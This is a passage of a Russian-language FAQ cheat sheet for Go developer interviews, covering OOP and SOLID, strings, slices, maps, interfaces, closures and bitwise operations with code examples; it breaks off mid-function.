[{"content":"Структурирование информации - очень полезный навык. И дабы привнести некоторый порядок в этап подготовки к интервью на должность Golang разработчика (и немножко техлида) решил записывать в этой заметке в формате FAQ те вопросы, которые я задавал, задавали мне или просто были мной найдены на просторах сети вместе с ответами на них. Стоит относиться к ним как к шпаргалке (если затупишь на реальном интервью - будет где подсмотреть) и просто набору тем, которым тебе стоит уделить внимание.\n Расскажи о себе? Расскажи о своем самом интересном проекте? Кем был создан язык, какие его особенности? Что такое ООП? Как это сделано в Golang?  Как устроено инвертирование зависимостей? Как сделать свои методы для стороннего пакета?   Типы данных и синтаксис  Как устроены строки в Go? В чём ключевое отличие слайса (среза) от массива? Как работает append в слайсе?  Задача про слайсы #1   Что можешь рассказать про map?  Как растет map? Что там про поиск? Есть ли у map такие же методы как у слайса: len, cap? Какие типы ключей разрешены для ключа в map? Может ли ключом быть структура? Если может, то всегда ли? Что будет в map, если не делать make или short assign? Race condition. Потокобезопасна ли мапа?   Что такое интерфейс?  Как устроен Duck-typing в Go? Интерфейсный тип Пустой interface{}   Что такое замыкание? Какие битовые операции знаешь? Дополнительный блок фигурных скобок в функции Что такое захват переменной? Как работает defer? Как работает init? Прерывание for/switch или for/select Сколько можно возвращать значений из функции?   Память и управление ей  Что такое heap и stack? Где выделяется память под переменную? Можно ли этим управлять? Какое поведение по умолчанию используется в Go при передаче в функцию? Что можешь рассказать про escape analysis?   Сoncurrency (конкурентность)  Как устроен мьютекс?  В чем отличие sync.Mutex от sync.RWMutex?   Что такое synс.Map? Какие ещё примитивы синхронизации знаешь?  sync.WaitGroup sync.Cond sync.Once sync.Pool   Какие типы каналов существуют?  Что можно делать с закрытым каналом?   Расскажи про планировщик (горутин) Что такое горутина?  В чем отличия горутин от потов ОС? Где аллоцируется память для горутин? Как завершить много горутин?   Кейсы использования контекста  context.WithCancel() context.WithDeadline() context.WithTimeout() context.WithValue()   Как задетектить гонку?   Тестирование  TDT, Table-driven tests (табличное тестирование) Имя пакета с тестами Статические анализаторы (линтеры) Ошибка в бенчмарке Что про функциональное тестирование?   Профилирование (pprof)  Пример использования pprof Так как же профилировщик работает в принципе?   Компилятор  Какие директивы компилятора знаешь?  //go:linkname //go:nosplit //go:norace //go:noinline //go:noescape //go:build //go:generate //go:embed        Расскажи о себе? Чаще всего этот вопрос идёт первым и даёт возможность интервьюверу задать вопросы связанные с твоим резюме, познакомиться с тобой, попытаться понять твой характер для построения последующих вопросов. Следует иметь в виду, что интервьюверу не всегда удается подготовиться к интервью, или он банально не имеет перед глазами твоего резюме. Тут есть смысл ещё раз представиться (часто в мессенджерах используются никнеймы, а твоё реальное имя он мог забыть), назвать свой возраст, образование, рассказать о предыдущих местах работы и должностях, сколько лет в индустрии, какие ЯП и технологии использовал - только \u0026ldquo;по верхам\u0026rdquo;, для того чтоб твой собеседник просто понял с кем он \u0026ldquo;имеет дело\u0026rdquo;.\nРасскажи о своем самом интересном проекте? К этому вопросу есть смысл подготовиться заранее и не спустя рукава. Дело в том, что это тот момент, когда тебе надо подобно павлину распустить хвост и создать правильное первое впечатление о себе, так как этот вопрос чаще всего идёт первым. Возьми и выпиши для себя где-нибудь на листочке основные тезисы о том, что это был за проект/сервис/задача, уделяя основное внимание тому какой профит это принесло для компании/команды в целом. Например:\n Я со своей командой гоферов из N человек в течении трех месяцев создали аналог сервиса у которого компания покупала данные за $4000 в месяц, а после перехода на наш сервис - расходы сократились до $1500 в месяц и значительно повысилось их качество и uptime; Внедренные мной практики в CI/CD пайплайны позволили сократить время на ревью изменений в проектах на 25..40%, а зная сколько стоит время работы разработчиков - вы сами всё понимаете; Разработанный мной сервис состоял из такого-то набора микросервисов, такие-то службы и протоколы использовал, были такие-то ключевые проблемы которые мы так-то зарешали; основной ценностью было то-то.  Кем был создан язык, какие его особенности? Go (часто также golang) - компилируемый многопоточный язык программирования, разработанный внутри компании Google. Разработка началась в 2007 году, его непосредственным проектированием занимались Роберт Гризмер, Роб Пайк и Кен Томпсон. Официально язык был представлен в ноябре 2009 года.\nВ качестве ключевых особенностей можно выделить:\n Простая грамматика (минимум ключевых слов - язык создавался по принципу \u0026ldquo;что ещё можно выкинуть\u0026rdquo; вместо \u0026ldquo;что бы ещё в него добавить\u0026rdquo;) Строгая типизация и отказ от иерархии типов (но с сохранением объектно-ориентированных возможностей) Сборка мусора (GC) Простые и эффективные средства для распараллеливания вычислений Чёткое разделение интерфейса и реализации Наличие системы пакетов и возможность импортирования внешних зависимостей (пакетов) Богатый тулинг \u0026ldquo;из корочки\u0026rdquo; (бенчмарки, тесты, генерация кода и документации), быстрая компиляция  Для того, чтоб вспомнить историю создания Go и о его особенностях можно посмотреть:\n  Что такое ООП? Как это сделано в Golang? ООП это методология (подход) программирования, основанная на том, что программа представляет собой некоторую совокупность объектов-классов, которые образую иерархию наследования. Ключевые фишки - минимализация повторяемости кода (принцип DRY) и удобство понимания/управления. Фундаментом ООП можно считать идею описания объектов в программировании подобно объектам из реального мира - у них есть свойства, поведение, они могут взаимодействовать. Мы (люди) так понимаем мир, и нам (людям) так проще описывать всякие штуки в коде. Основные принципы в ООП:\n  Абстракция вообще присуща для любого программирования, а не только для ООП. По большому счету (топорный, но понятный пример) это про выделение общего и объединение этого в какие-то сущности но без реализации, про контракты. Например - экземпляры абстрактных классов не могут быть созданы (new AbstractClass), но могут содержать абстрактные методы, чтоб разработчик решив наследоваться от этого абстрактного класса их реализовал так, как ему нужно для своих целей (например - ходить в SQL СУБД или файл). Другой пример - это интерфейсы, они же контракты чистой воды - содержат только сигнатуры методов и ни капельки реализации. Но абстракция не ограничивается ими и должна быть умеренной, так как усложняет архитектуру приложения в общем и целом. Опираться следует на интуицию и опыт. Слишком много слоев абстракции (ещё раз - тут дело не ограничивается интерфейсами и абстрактными классами) приводит к переусложнению и головной боли последующего сопровождения продукта. Недостаточная - к сложности внесения изменений и расширению функционала.\n  Инкапсуляция про контроль доступа к свойствам объекта и их динамическая валидация/преобразования. Если метод/свойство должно быть доступно \u0026ldquo;из вне\u0026rdquo; объекта - объявляем публичным, иначе - приватным. Если есть необходимость переопределять его из потомков класса - то защищенным (protected). Python, например, реализуют инкапсуляцию, но не предусматривает возможности сокрытия в принципе; в то время как С++ и Java она просто всюду.\n  Наследование это возможность (барабанная дробь!) наследоваться одним объектам от других, \u0026ldquo;перенимая\u0026rdquo; все методы родительских объектов. Своеобразный вариант Матрешки. Т.е. выделяя в родительских объектах \u0026ldquo;всё общее\u0026rdquo; мы можем не повторяться в реализации частных, а просто \u0026ldquo;наследоваться\u0026rdquo;.\n  Полиморфизм - \u0026ldquo;поли\u0026rdquo; - много, \u0026ldquo;морф\u0026rdquo; - вид. Везде, где есть интерфейсы - подразумевается полиморфизм. Суть - это контракты (интерфейсы), мы можем объявить \u0026ldquo;что-то умеет закрывать себя методом Close()\u0026rdquo;, и нам не важно что именно это будет. Реализаций может быть много, и если это что-то умеет делать то, что нам надо - нам удобнее с этим работать.\n  Тут же можно упомянуть про знание SOLID, а именно:\n  S (single responsibility principle, принцип единственной ответственности) - определенный класс/модуль должен решать только определенную задачу, максимально узко но максимально хорошо (своеобразные UNIX-way). Если для выполнения своей задачи ему требуются какие-то другие ресурсы - они в него должны быть инкапсулированы (это отсылка к принципу инверсии зависимостей).\n  O (open-closed principle, принцип открытости/закрытости) - классы/модули должны быть открыты для расширения, но закрыты для модификации. Должна быть возможность расширить поведение, наделить новым функционалом, но при этом исходный код/логика модуля должна быть неизменной.\n  L (Liskov substitution principle, принцип подстановки Лисков) - поведение наследующих классов не должно противоречить поведению, заданному базовым классом, то есть поведение наследующих классов должно быть ожидаемым для кода.\n  I (interface segregation principle, принцип разделения интерфейса) - много тонких интерфейсов лучше, чем один толстый.\n  D (dependency inversion principle, принцип инверсии зависимостей) - \u0026ldquo;завязываться\u0026rdquo; на абстракциях (интерфейсах), а не конкретных реализациях. Так же (это уже про IoC, но всё же) можно рассказать что если какому-то классу для своей работы требуется функциональность другого - то есть смысл \u0026ldquo;запрашивать\u0026rdquo; её в конструкторе нашего класса используя интерфейс, под который подходит наша зависимость. Таким образом целевая реализация опирается только на интерфейсы (не зависит от реализаций) и соответствует принципу под буквой S.\n  А теперь о том, как это реализовано в Go (наконец-то!).\nВ Go нет классов, объектов, исключений и шаблонов. Нет иерархии типов, но есть сами типы (т.е. возможность описывать свои типы/структуры). Структурные типы (с методами) служат тем же целям, что и классы в других языках. Так же следует упомянуть что структура определяет состояние.\nВ Go нет наследования. Совсем. Но есть встраивание (называемое \u0026ldquo;анонимным\u0026rdquo;, так как Foo в Bar встраивается не под каким-то именем, а без него) при этом встраиваются и свойства, и функции:\nimport \u0026#34;fmt\u0026#34; type Foo struct { name string Surname string } func (f Foo) SayName() string { return f.name } type Bar struct { Foo } func main() { bar := Bar{Foo{name: \u0026#34;one\u0026#34;, Surname: \u0026#34;baz\u0026#34;}} fmt.Println(bar.SayName()) // one \tfmt.Println(bar.Surname) // baz  bar.name = \u0026#34;two\u0026#34; fmt.Println(bar.SayName()) // two } Есть интерфейсы (это типы, которые объявляют наборы методов). Подобно интерфейсам в других языках, они не имеют реализации. Объекты, которые реализуют все методы интерфейса, автоматически реализуют интерфейс (так называемый Duck-typing). Не существует наследования или подклассов или ключевого слова Implements:\nimport \u0026#34;fmt\u0026#34; type Speaker interface { Speak() string } type Foo struct{} func (Foo) Speak() string { return \u0026#34;foo\u0026#34; } type Bar struct{} func (Bar) Speak() string { return \u0026#34;bar\u0026#34; } func main() { var foo, bar Speaker = new(Foo), \u0026amp;Bar{} fmt.Println(foo.Speak()) // foo \tfmt.Println(bar.Speak()) // bar } А примере выше мы объявили переменные foo и bar с явным указанием интерфейсного типа, а так интерфейс это ссылочный тип - то и структуры мы инициализировали указателями на них с использованием new() (что аллоцирует структуру с возвращает указатель на неё) и (или) \u0026amp;.\nИнкапсуляция реализована на уровне пакетов. Имена, начинающиеся со строчной буквы, видны только внутри этого пакета (не являются экспортируемыми). И наоборот - всё, что начинается с заглавной буквы - доступно из-вне пакета. Дешево и сердито.\nПолиморфизм - это основа объектно-ориентированного программирования: способность обрабатывать объекты разных типов одинаково, если они придерживаются одного и того же интерфейса. Интерфейсы Go предоставляют эту возможность очень прямым и интуитивно понятным способом. Пример использования интерфайса был описан выше.\n Что можно почитать:\n ООП в картинках Golang и ООП   Как устроено инвертирование зависимостей? Инвертирование зависимостей позволяет в нашем коде не \u0026ldquo;завязываться\u0026rdquo; на конкретную реализацию (используя, например, интерфейсы), тем самым понижая связанность кода и повышая его тестируемость. Так же сужается зона ответственности конечной структуры/пакета, что повышает его переиспользуемость.\nПринцип инверсии зависимостей (dependency inversion principle) в Go который можно реализовывать следующим образом:\nimport ( \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; ) type speaker interface { Speak() string } type Foo struct { s speaker // s *Foo - было бы плохо } func NewFoo(s speaker) (*Foo, error) { if s == nil { return nil, errors.New(\u0026#34;speaker is nil\u0026#34;) } return \u0026amp;Foo{s: s}, nil } func (f Foo) SaySomething() string { return f.s.Speak() } func main() { var foo, err = NewFoo(someSpeaker) if err != nil { panic(err) } fmt.Println(foo.SaySomething()) // depends on the speaker implementation } Мы объявляем интерфейс speaker не экспортируемым на нашей, принимающей стороне, и используя псевдо-конструктор NewFoo гарантируем что свойство s будет проинициализировано верным типом (дополнительно проверяя его на nil).\nКак сделать свои методы для стороннего пакета? Например, если мы используем логгер Zap в нашем проекте, и хотим к этому Zap-у прикрутить наши методы - то для этого нам нужно будет создать свою структуру, внутри в неё встраивать логгер Zap-а, и к этой структуре уже прикручивать требуемые методы. Просто \u0026ldquo;навесить сверху\u0026rdquo; функции на сторонний пакет мы не можем.\nТипы данных и синтаксис К фундаментальным типам данных можно отнести:\n Целочисленные - int{8,16,32,64}, int, uint{8,16,32,64}, uint, byte как синоним uint8 и rune как синоним int32. Типы int и uint имеют наиболее эффективный размер для определенной платформы (32 или 64 бита), причем различные компиляторы могут предоставлять различный размер для этих типов даже для одной и той же платформы Числа с плавающей запятой - float32 (занимает 4 байта/32 бита) и float64 (занимает 8 байт/64 бита) Комплексные числа - complex64 (вещественная и мнимая части представляют числа float32) и complex128 (вещественная и мнимая части представляют числа float64) Логические aka bool Строки string  Как устроены строки в Go? В Go строка в действительности является слайсом (срезом) байт, доступным только для чтения. Строка содержит произвольные байты, и у неё нет ёмкости (cap). При преобразовании слайса байт в строку (str := string(slice)) или обратно (slice := []byte(str)) - происходит копирование массива (со всеми следствиями).\nСоздание подстрок работает очень эффективно. Поскольку строка предназначена только для чтения, исходная строка и строка, полученная в результате операции среза, могут безопасно совместно использовать один и тот же массив:\nvar ( str = \u0026#34;hello world\u0026#34; sub = str[0:5] usr = \u0026#34;/usr/kot\u0026#34;[5:] ) print(sub, \u0026#34; \u0026#34;, usr) // hello kot Go использует тип rune (алиас int32) для представления Unicode. Конструкция for ... range итерирует строку посимвольно (а не побайтово, как можно было бы предположить):\nvar str = \u0026#34;привет\u0026#34; println(str, len(str)) // привет 12  for i, c := range str { println(i, c, string(c)) } // 0 1087 п // 2 1088 р // 4 1080 и // 6 1074 в // 8 1077 е // 10 1090 т И мы видим, что для кодирования каждого символа кириллицы используются по 2 байта.\nЭффективным способом работы со строками (когда есть необходимость часто выполнять конкатенацию, например) является использование слайса байт или strings.Builder:\nimport \u0026#34;strings\u0026#34; func main() { // происходит только 1 аллокация при вызове `Grow()` \tvar str strings.Builder str.Grow(12) // сразу выделяем память  str.WriteString(\u0026#34;hello\u0026#34;) str.WriteRune(\u0026#39; \u0026#39;) str.WriteString(\u0026#34;мир\u0026#34;) println(str.String()) // hello мир } И ещё одну важную особенность стоит иметь в виду - это подсчет длины строки (например - для какой-нибудь валидации). Если считать по количеству байт, и строка содержит не только ASCII символы - то количество байт и фактическое количество символов будут расходиться:\nconst str = \u0026#34;hello мир!\u0026#34; println(len(str), utf8.RuneCountInString(str)) // 13 10 Тут дело в том, что для кодирования символов м, и и р используются 2 байта вместо одного. Поэтому len == 13, а фактически в строке лишь 10 символов (пакет utf8, к примеру, нам в помощь).\n Что можно почитать:\n Строка, байт, руна, символ в Golang   В чём ключевое отличие слайса (среза) от массива?  Срез - всегда указатель на массив, массив - значение Срез может менять свой размер и динамически аллоцировать память   В Go не бывает ссылок - но есть указатели. Где говорится про \u0026ldquo;по ссылке\u0026rdquo; имеется в виду \u0026ldquo;по указателю\u0026rdquo;\n Слайсы и массивы в Go это проиндексированные упорядоченные структуры данных последовательностей элементов. Ёмкость массива объявляется в момент его создания, и после изменить её уже нельзя (его длина это часть его типа). Память, необходимая для хранения элементов массива выделяется соответственно сразу при его объявлении, и по умолчанию инициализируется в соответствии с нулевыми значением для типа (fasle для bool, 0 для int, nil для интерфейсов и т.д.). На стеке можно разместить массив объемом 10 MB. В качестве размера можно использовать константы (компилятор должен знать это значение на этапе компиляции, т.е. что-то вида var a [getSize()]int или i := 3; var a [i]int недопустимо):\nconst mySize uint8 = 8 type myArray [mySize]byte var constSized = [...]int{1, 2, 3} // размер сам посчитается исходя из кол-ва эл-ов Кстати, массивы с элементами одного типа но с разными размерами являются разными типами. Массивы не нужно инициализировать явно; нулевой массив - это готовый к использованию массив, элементы которого являются нулями:\nvar a [4]int // [0 0 0 0]  a[0] = 1 // [1 0 0 0] i := a[0] // i == 1 Представление [4]int в памяти - это просто четыре целых значения, расположенных последовательно. Так же следует помнить что в Go массивы передаются по значению, т.е. передавая массив в какую-либо функцию она получает копию массива (для передачи его указателя нужно явно это указывать, т.е. foo(\u0026amp;a)).\nА слайс же это своего рода версия массива но с вариативным размером (структура данных, которая строится поверх массива и предоставляет доступ к элементами базового массива). Слайсы до 64 KB могут быть размещены на стеке. Если посмотреть исходники Go (src/runtime/slice.go), то увидим:\ntype slice struct { array unsafe.Pointer // указатель на массив \tlen int // длина (length) \tcap int // вместимость (capacity) } Для аллокации слайса можно воспользоваться одной из команд ниже:\nvar ( a = []int{} // [] len=0 cap=0 \tb = []int{1, 2} // [1 2] len=2 cap=2 \tc = []int{5: 1} // [0 0 0 0 0 123] len=6 cap=6 \td = make([]int, 5, 10) // [0 0 0 0 0] len=5 cap=10 ) В последнем случае рантайм Go создаст массив из 10 элементов (выделит память и заполнит их нулями) но доступны прямо сейчас нам будут только 5, и установит значения len в 5, а cap в 10. Cap означает ёмкость и помогает зарезервировать место в памяти на будущее, чтобы избежать лишних операций выделения памяти при росте слайса (это ключевой параметр для аллокации памяти, влияет на производительность вставки в срез). При добавлении новых элементов в слайс новый массив для него не будет создаваться до тех пор, пока cap меньше len.\nСлайсы передаются \u0026ldquo;по ссылке\u0026rdquo; (фактически будет передана копия структуры slice со своими len и cap, но указатель на массив array будет тот-же самый). Для защиты слайса от изменений следует передавать его копию:\nvar ( a = []int{1, 2, 0, 0, 1} b = make([]int, len(a)) ) copy(b, a) fmt.Println(a, b) // [1 2 0 0 1] [1 2 0 0 1] Важной особенностью является то, так как \u0026ldquo;под капотом\u0026rdquo; у слайса лежит указатель на массив - при изменении значений слайса они будут изменяться везде, где слайс используется (будь то присвоение в переменную, передача в функцию и т.д.) до момента, пока размер слайса не будет переполнен и не будет выделен новый массив для его значений (т.е. в момент изменения cap слайса всегда происходит копирование данных массива):\nvar ( one = []int{1, 2} // [1 2] \ttwo = one // [1 2] ) two[0] = 123 fmt.Println(one, two) // [123 2] [123 2]  one = append(one, 666) fmt.Println(one, two) // [123 2 666] [123 2]  Что можно почитать:\n Как не наступать на грабли в Go Слайсы в Go: использование и особенности Принцип работы типа slice в GO   Как работает append в слайсе? append() делает простую операцию - добавляет элементы в слайс и возвращает новый. Но под капотом там делаются довольно сложные манипуляции, чтобы выделять память только при необходимости и делать это эффективно.\nСперва append сравнивает значения len и cap у слайса. Если len меньше чем cap, то значение len увеличивается, а само добавляемое значение помещается в конец слайса. В противном случае происходит выделение памяти под новый массив для элементов слайса, в него копируются значения из старого, и значение помещается уже в новый массив.\nУвеличении размера слайса (метод growslice) происходит по следующему алгоритму - если его размер менее 1024 элементов, то его размер будет увеличиваться вдвое; иначе же слайс увеличивается на ~12.5% от своего текущего размера.\nЧто важно помнить - если на основании слайса one выделить подслайс two, а затем увеличим слайс one (и его вместимость будет превышена) - то one и two будут уже ссылаться на разные участки памяти!\nvar ( one = make([]int, 4) // [0 0 0 0] \ttwo = one[1:3] // [0 0] ) one[2] = 11 fmt.Println(one, two) // [0 0 11 0] [0 11] fmt.Printf(\u0026#34;%p %p\\n\u0026#34;, one, two) // 0xc0000161c0 0xc0000161c8  one = append(one, 1) fmt.Printf(\u0026#34;%p %p\\n\u0026#34;, one, two) // 0xc00001c1c0 0xc0000161c8  one[2] = 22 fmt.Println(one, two) // [0 0 22 0 1] [0 11] fmt.Printf(\u0026#34;%p %p\\n\u0026#34;, one, two) // 0xc00001c1c0 0xc0000161c8 Есть еще много примеров добавления, копирования и других способов использования слайсов тут - Slice Tricks.\n Что можно почитать:\n Как не наступать на грабли в Go   Задача про слайсы #1 Вопрос: У нас есть 2 функции - одна делает append() чего-то в слайс, а другая просто сортирует слайс, используя пакет sort. Модифицируют ли слайс первая и (или) вторая функции?\nОтвет: append() не модифицирует а возвращает новый слайс, а sort модифицирует порядок элементов, если он изначально был не отсортирован.\nЧто можешь рассказать про map? Карта (map или hashmap) - это неупорядоченная коллекция пар вида ключ-значение. Пример:\ntype myMap map[string]int Подобно массивам и слайсам, к элементам мапы можно обратиться с помощью скобок:\nvar m = make(map[string]int) // инициализация  m[\u0026#34;one\u0026#34;] = 1 // запись в мапу  fmt.Println(m[\u0026#34;one\u0026#34;], m[\u0026#34;two\u0026#34;]) // 1 0  Лучше выделить память заранее (передавая вторым аргументом функции make), если известно количество элементов - избежим эвакуаций\n В случае с m[\u0026quot;two\u0026quot;] вернулся 0 так как это является нулевым значением для типа int. Для проверки существования ключа используем конструкцию вида (доступ к элементу карты может вернуть два значения вместо одного) называемую \u0026ldquo;multiple assignment\u0026rdquo;:\nvar m = map[string]int{\u0026#34;one\u0026#34;: 1} v1, ok1 := m[\u0026#34;one\u0026#34;] // чтение v2, ok2 := m[\u0026#34;two\u0026#34;] fmt.Println(v1, ok1) // 1 true fmt.Println(v2, ok2) // 0 false  for k, v := range m { // итерация всех эл-ов мапы \tfmt.Println(k, v) } delete(m, \u0026#34;one\u0026#34;) // удаление  v1, ok1 = m[\u0026#34;one\u0026#34;] fmt.Println(v1, ok1) // 0 false Мапы всегда передаются по ссылке (вообще-то Go не бывает ссылок, невозможно создать 2 переменные с 1 адресом, как в С++ например; но зато можно создать 2 переменные, указывающие на один адрес - но это уже указатели). Если же быть точнее, то мапа в Go - это просто указатель на структуру hmap:\ntype hmap struct { // Note: the format of the hmap is also encoded in cmd/compile/internal/reflectdata/reflect.go. \t// Make sure this stays in sync with the compiler\u0026#39;s definition. \tcount int // # live cells == size of map. Must be first (used by len() builtin) \tflags uint8 B uint8 // log_2 of # of buckets (can hold up to loadFactor * 2^B items) \tnoverflow uint16 // approximate number of overflow buckets; see incrnoverflow for details \thash0 uint32 // hash seed  buckets unsafe.Pointer // array of 2^B Buckets. may be nil if count==0. \toldbuckets unsafe.Pointer // previous bucket array of half the size, non-nil only when growing \tnevacuate uintptr // progress counter for evacuation (buckets less than this have been evacuated)  extra *mapextra // optional fields } Так же структура hmap содержит в себе следующее:\n Количество элементов Количество \u0026ldquo;ведер\u0026rdquo; (представлено в виде логарифма для ускорения вычислений) Seed для рандомизации хэшей (чтобы было сложнее заddosить - попытаться подобрать ключи так, что будут сплошные коллизии) Всякие служебные поля и главное указатель на buckets, где хранятся значения   hmap \nНа картинке схематичное изображение структуры в памяти - есть хэдер hmap, указатель на который и есть map в Go (именно он создается при объявлении с помощью var, но не инициализируется, из-за чего падает программа при попытке вставки). Поле buckets - хранилище пар ключ-значение, таких \u0026ldquo;ведер\u0026rdquo; несколько, в каждом лежит 8 пар. Сначала в \u0026ldquo;ведре\u0026rdquo; лежат слоты для дополнительных битов хэшей (e0..e7 названо e - потому что extra hash bits). Далее лежат ключи и значения как сначала список всех ключей, потом список всех значений.\nПо хэш функции определяется в какое \u0026ldquo;ведро\u0026rdquo; мы кладем значение, внутри каждого \u0026ldquo;ведра\u0026rdquo; может лежать до 8 коллизий, в конце каждого \u0026ldquo;ведра\u0026rdquo; есть указатель на дополнительное, если вдруг предыдущее переполнилось.\nКак растет map? В исходном коде можно найти строчку Maximum average load of a bucket that triggers growth is 6.5. То есть, если в каждом \u0026ldquo;ведре\u0026rdquo; в среднем более 6,5 элементов, происходит увеличение массива buckets. При этом выделяется массив в 2 раза больше, а старые данные копируются в него маленькими порциями каждые вставку или удаление, чтобы не создавать очень крупные задержки. Поэтому все операции будут чуть медленнее в процессе эвакуации данных (при поиске тоже, нам же приходится искать в двух местах). После успешной эвакуации начинают использоваться новые данные.\nИз-за эвакуации данных нельзя и взять адрес мапы - представьте, что мы взяли адрес значения, а потом мапа выросла, выделилась новая память, данные эвакуировались, старые удалились, указатель стал неправильным, поэтому такие операции запрещены.\nЧто там про поиск? Поиск, если разобраться, устроен не так уж и сложно: проходимся по цепочкам \u0026ldquo;ведер\u0026rdquo;, переходя в следующее, если в этом не нашли. Поиск в \u0026ldquo;ведре\u0026rdquo; начинается с быстрого сравнения дополнительного хэша, для которого используется всего 8 бит (вот для чего эти e0...e7 в начале каждого - это \u0026ldquo;мини\u0026rdquo; хэш пары для быстрого сравнения). Если не совпало, идем дальше, если совпало, то проверяем тщательнее - определяем где лежит в памяти ключ, подозреваемый как искомый, сравниваем равен ли он тому, что запросили. Если равен, определяем положение значения в памяти и возвращаем.\nК сожалению, мир не совершенен. Когда имя хешируется, то некоторые данные теряются, так как хеш, как правило, короче исходной строки. Таким образом, в любой реализации хеш таблицы неизбежны коллизии когда по двум ключам получаются одинаковые хеши. Как следствие, поиск может быть дороже чем O(1) (возможно это связано с кешем процессора и коллизиями коротких хэшей), так что иногда выгоднее использовать бинарный поиск по слайсу данных нежели чем поиск в мапе (пишите бенчмарки).\n Что можно почитать:\n Хэш таблицы в Go. Детали реализации Кажется, поиск в map дороже чем O(1)   Есть ли у map такие же методы как у слайса: len, cap? У мапы есть len но нет cap. У нас есть только overflow который указывает \u0026ldquo;куда-то\u0026rdquo; когда мапа переполняется, и поэтому у нас не может быть capacity.\nКакие типы ключей разрешены для ключа в map? Любым сравнимым (comparable) типом, т.е. булевы, числовые, строковые, указатели, канальные и интерфейсные типы, а также структуры или массивы, содержащие только эти типы. Слайсы, мапы и функции использовать нельзя, так как эти типы не сравнить с помощью оператора == или !=.\nМожет ли ключом быть структура? Если может, то всегда ли? Как было сказано выше - структура может быть ключом до тех пор, пока мы в поля структуры не поместим какой-либо слайс, мапу или любой другой non-comparable тип данных (например - функцию).\nЧто будет в map, если не делать make или short assign? Будет паника (например - при попытке что-нибудь в неё поместить), так как любые \u0026ldquo;структурные\u0026rdquo; типы (а мапа как мы знаем таковой является) должны быть инициализированы для работы с ними.\nRace condition. Потокобезопасна ли мапа? Нет, потокобезопасной является sync.Map. Для обеспечения безопасности вокруг мапы обычно строится структура вида:\ntype ProtectedIntMap struct { mx sync.RWMutex m map[string]int } func (m *ProtectedIntMap) Load(key string) (val int, ok bool) { m.mx.RLock() val, ok = m.m[key] m.mx.RUnlock() return } func (m *ProtectedIntMap) Store(key string, value int) { m.mx.Lock() m.m[key] = value m.mx.Unlock() } Что такое интерфейс? Интерфейсы - это инструменты для определения наборов действий и поведения. Интерфейсы - это в первую очередь контракты. Они позволяют объектам опираться на абстракции, а не фактические реализации других объектов. При этом для компоновки различных поведений можно группировать несколько интерфейсов. В общем смысле - это набор методов, представляющих стандартное поведение для различных типов данных.\nКак устроен Duck-typing в Go?  Если это выглядит как утка, плавает как утка и крякает как утка, то это, вероятно, утка и есть.\n Если структура содержит в себе все методы, что объявлены в интерфейсе, и их сигнатуры совпадают - она автоматически удовлетворяет интерфейс.\nТакой подход позволяет полиморфно (полиморфизм - способность функции обрабатывать данные разных типов) работать с объектами, которые не связаны в иерархии наследования. Достаточно, чтобы все эти объекты поддерживали необходимый набор методов.\nИнтерфейсный тип В Go интерфейсный тип выглядит вот так:\ntype iface struct { tab *itab data unsafe.Pointer } Где tab - это указатель на Interface Table или itable - структуру, которая хранит некоторые метаданные о типе и список методов, используемых для удовлетворения интерфейса, а data указывает на реальную область памяти, в которой лежат данные изначального объекта (статическим типом).\nКомпилятор генерирует метаданные для каждого статического типа, в которых, помимо прочего, хранится список методов, реализованных для данного типа. Аналогично генерируются метаданные со списком методов для каждого интерфейса. Теперь, во время исполнения программы, runtime Go может вычислить itable на лету (late binding) для каждой конкретной пары. Этот itable кешируется, поэтому просчёт происходит только один раз.\nЗная это, становится очевидно, почему Go ловит несоответствия типов на этапе компиляции, но кастинг к интерфейсу - во время исполнения.\nЧто важно помнить - переменная интерфейсного типа может принимать nil. Но так как объект интерфейса в Go содержит два поля: tab и data - по правилам Go, интерфейс может быть равен nil только если оба этих поля не определены (faq):\nvar ( builder *strings.Builder stringer fmt.Stringer ) fmt.Println(builder, stringer) // nil nil fmt.Println(stringer == nil) // true fmt.Println(builder == nil) // true  stringer = builder fmt.Println(builder, stringer) // nil nil fmt.Println(stringer == nil) // false (!!!) fmt.Println(builder == nil) // true Пустой interface{} Ему удовлетворяет вообще любой тип. Пустой интерфейс ничего не означает, никакой абстракции. Поэтому использовать пустые интерфейсы нужно в самых крайних случаях.\n Что можно почитать:\n Краш-курс по интерфейсам в Go Реализация интерфейсов в Golang Интерфейсы в Go - как красиво выстрелить себе в ногу   Что такое замыкание? Замыкания - это такие функции, которые вы можете создавать в рантайме и им будет доступно текущее окружение, в рамках которого они были созданы.\nФункции, у которых есть имя - это именованные функции. Функции, которые могут быть созданы без указания имени - это анонимные функции.\nfunc main() { var text = \u0026#34;some string\u0026#34; var ourFunc = func() { // именованное замыкание \tprintln(text) } ourFunc() // some string \tgetFunc()() // another string } func getFunc() func() { return func() { // анонимное \tprintln(\u0026#34;another string\u0026#34;) } } Замыкания сохраняют состояние. Это означает, что состояние переменных содержится в замыкании в момент декларации. Одна из самых очевидных ловушек - это создание замыканий в цикле:\nvar funcs = make([]func(), 0, 5) for i := 0; i \u0026lt; 5; i++ { funcs = append(funcs, func() { println(\u0026#34;counter =\u0026#34;, i) }) // исправляется так: \t//var value = i \t//funcs = append(funcs, func() { println(\u0026#34;counter =\u0026#34;, value) }) } for _, f := range funcs { f() } // counter = 5 (так все 5 раз)  Что можно почитать:\n Замыкания   Какие битовые операции знаешь? Побитовые операторы проводят операции непосредственно на битах числа.\n// Побитовое И/AND (разряд результата равен 1 только тогда, когда оба соответствующих бита операндов равны 1) println(0b111_000 /* 56 */ \u0026amp; 0b011_110 /* 30 */ == 0b011_000 /* 24 */) // Побитовое ИЛИ/OR (разряд результата равен 0 только тогда, когда оба соответствующих бита в равны 0) println(0b111_000 /* 56 */ | 0b011_110 /* 30 */ == 0b111_110 /* 62 */) // Исключающее ИЛИ/XOR (разряд результата равен 1 только тогда, когда только один бит равен 1) println(0b111_000 /* 56 */ ^ 0b011_110 /* 30 */ == 0b100_110 /* 38 */) // Сброс бита AND NOT println(0b111_001 /* 57 */ \u0026amp;^ 0b011_110 /* 30 */ == 0b100_001 /* 33 */) // Сдвиг бита влево println(0b000_001 /* 1 */ \u0026lt;\u0026lt; 3 == 0b001_000 /* 8 */) // Сдвиг бита вправо println(0b000_111 /* 7 */ \u0026gt;\u0026gt; 1 == 0b000_011 /* 3 */) Пример использования простой битовой маски:\ntype Bits uint8 const ( F0 Bits = 1 \u0026lt;\u0026lt; iota // 0b00_000_001 == 1 \tF1 // 0b00_000_010 == 2 \tF2 // 0b00_000_100 == 4 ) func Set(b, flag Bits) Bits { return b | flag } func Clear(b, flag 